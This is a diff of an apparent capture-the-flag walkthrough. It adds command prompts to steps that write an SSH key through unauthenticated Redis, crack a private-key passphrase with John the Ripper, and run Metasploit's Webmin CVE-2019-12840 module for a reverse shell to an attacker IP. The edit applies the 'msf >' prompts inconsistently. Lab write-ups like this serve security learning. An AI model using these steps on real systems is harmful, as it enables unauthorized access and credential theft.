@@ -90,7 +90,7 @@ After intercepting the login request with Burp Suite, I identified POST paramete
 Suspecting potential SQL injection vulnerabilities, I saved the request as a text file and tested the login form using SQLMap:
 
 ```
-sqlmap -r req.txt
+$ sqlmap -r req.txt
 ```
 
 However, the testing revealed that the login form parameters were not vulnerable to SQL injection techniques. This necessitated exploring alternative attack vectors.
@@ -100,26 +100,26 @@ However, the testing revealed that the login form parameters were not vulnerable
 With the Webmin login remaining inaccessible through direct exploitation, I shifted focus to the Redis service discovered on port 6379. Redis is a popular in-memory data store, but when improperly configured without authentication, it can become a critical security vulnerability. I connected to the Redis instance to verify anonymous access:
 
 ```
-redis-cli -h 10.129.2.1
+$ redis-cli -h 10.129.2.1
 10.129.2.1:6379>
 ```
 
 The Redis server responded to unauthenticated connections, confirming that no password protection was enabled. Redis stores data in a key-value format and can persist data to disk in RDB (Redis Database) format. This functionality, combined with the ability to configure the persistence directory, creates an opportunity to write arbitrary files to the file system. I generated a new SSH key pair for the attack:
 
 ```
-ssh-keygen -t rsa -f redis_key
+$ ssh-keygen -t rsa -f redis_key
 ```
 
 The generated public key needed to be formatted with newlines to account for potential RDB file corruption:
 
 ```
-(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
+$ (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
 ```
 
 I then loaded this formatted public key into Redis as a key-value pair:
 
 ```
-cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
+$ cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
 ```
 
 Next, I configured Redis to save its database to a file named `authorized_keys` in the `redis` users's home directory, which i supposed to be `/var/lib/redis`:
@@ -141,7 +141,7 @@ The `save` command persisted the Redis database to disk. The RDB format would in
 With the public key now present in the `redis` user's home directory, I attempted to authenticate via SSH using the corresponding private key:
 
 ```
-ssh -i redis_key redis@10.129.2.1
+$ ssh -i redis_key redis@10.129.2.1
 ```
 
 The connection succeeded, granting me shell access as the redis user. I verified my access:
@@ -203,13 +203,13 @@ DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
 To crack the passphrase protecting the private key, I transferred the key to my attack machine and converted it to a hashable format using `ssh2john`:
 
 ```
-ssh2john id_rsa.bak > id_rsa.hash
+$ ssh2john id_rsa.bak > id_rsa.hash
 ```
 
 I then used John the Ripper to crack the hash against the `rockyou.txt` wordlist:
 
 ```
-john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ...SNIP...
 
@@ -249,24 +249,24 @@ Having obtained valid credentials (`Matt: computer2008`), I attempted to authent
 Upon accessing Webmin, I noted the version displayed as 1.910. This version is known to be vulnerable to CVE-2019-12840, a package upload vulnerability that permits remote code execution. The vulnerability exists in the package management module, specifically in the processing of uploaded packages. I configured the Metasploit framework to exploit this vulnerability:
 
 ```
-use exploit/linux/http/webmin_packageup_rce
+msf > use exploit/linux/http/webmin_packageup_rce
 set username Matt
-set password computer2008
+msf > set password computer2008
 set rhost 10.129.2.1
-set lhost 10.10.14.102
+msf > set lhost 10.10.14.102
 set lport 4444
 ```
 
 This first attempt failed with the error "Failed to retrieve session cookie." The Webmin interface on the target system was communicating over HTTPS rather than HTTP. I corrected the exploit configuration:
 
 ```
-set ssl true
+msf > set ssl true
 ```
 
 After enabling SSL, I executed the exploit:
 
 ```
-run
+msf > run
 ```
 
 The exploit successfully retrieved the session cookie and initiated the payload delivery. The vulnerability allows arbitrary command execution through the package upload functionality. The exploit uploaded a malicious payload that executed a reverse shell connection back to my attack machine:
